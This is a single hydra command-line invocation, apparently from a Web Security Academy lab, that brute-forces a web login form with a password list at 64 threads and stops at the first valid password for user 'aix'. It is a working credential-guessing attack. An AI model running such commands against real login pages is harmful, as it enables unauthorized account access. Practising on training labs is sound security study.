hydra 0a3d00540453ad908016c6d50048003c.web-security-academy.net  -l aix -P p.txt https-post-form \
"/login:username=aix&password=^PASS^:F=Incorrect password" -f -t 64 -I
